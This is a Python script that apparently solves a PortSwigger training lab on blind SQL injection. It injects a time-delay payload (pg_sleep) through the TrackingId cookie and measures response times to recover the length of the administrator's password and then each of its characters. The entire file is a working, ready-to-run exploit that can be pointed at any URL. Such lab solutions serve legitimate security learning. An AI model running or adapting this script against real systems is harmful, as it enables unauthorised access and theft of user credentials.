#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import string
import time


DELAY_SECONDS = 5


async def check_condition(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    condition: str,
    delay: int = DELAY_SECONDS,
) -> bool:
    """Check if a SQL condition is true by measuring response delay."""
    payload = (
        f"'; SELECT CASE WHEN ({condition}) "
        f"THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users--"
    )
    headers = {"Cookie": f"TrackingId={payload}; session={session}"}
    start = time.monotonic()
    try:
        async with client.get(url, headers=headers, ssl=False) as res:
            await res.text()
            elapsed = time.monotonic() - start
            return elapsed >= delay - 1.5  # allow margin for network latency
    except aiohttp.ClientError:
        return False


async def get_password_length(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    username: str = "administrator",
    max_length: int = 30,
) -> int:
    """Determine password length using conditional time delays."""
    for length in range(1, max_length + 1):
        condition = f"username='{username}' AND LENGTH(password)={length}"
        if await check_condition(client, url, session, condition):
            print(f"[+] Password length: {length}")
            return length
    return 0


async def extract_password(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    password_length: int,
    username: str = "administrator",
    chars: str = string.digits + string.ascii_letters,
) -> str:
    """Extract password character by character using conditional time delays."""
    password = ""
    for pos in range(1, password_length + 1):
        found = False
        for char in chars:
            condition = f"username='{username}' AND SUBSTRING(password,{pos},1)='{char}'"
            if await check_condition(client, url, session, condition):
                password += char
                print(f"[+] Position {pos}: '{char}' → {password}")
                found = True
                break
        if not found:
            print(f"[-] Could not find character at position {pos}")
            break
    return password


async def main():
    parser = argparse.ArgumentParser(
        description="Solve Lab: Blind SQL injection with time delays and information retrieval"
    )
    parser.add_argument(
        "-u", "--url", type=str, required=True,
        help="URL of the PortSwigger lab (e.g. https://LAB-ID.web-security-academy.net/)",
    )
    parser.add_argument(
        "-s", "--session", type=str, required=True,
        help="Session cookie value",
    )

    args = parser.parse_args()
    url = args.url.strip()
    session = args.session.strip()

    print(f"[*] Using {DELAY_SECONDS}s delay for true conditions.")
    print("[*] This process is slow by nature — each true condition waits for the delay.\n")

    async with aiohttp.ClientSession(trust_env=True) as client:
        # Step 1: Determine password length
        print("[*] Determining password length...")
        pw_length = await get_password_length(client, url, session)

        if pw_length == 0:
            print("[-] Could not determine password length. Exiting.")
            return

        # Step 2: Extract password character by character
        print(f"[*] Extracting {pw_length}-character password...")
        password = await extract_password(client, url, session, pw_length)

        if password:
            print(f"\n[+] Administrator password: {password}")
        else:
            print("[-] Failed to extract password.")


if __name__ == "__main__":
    asyncio.run(main())
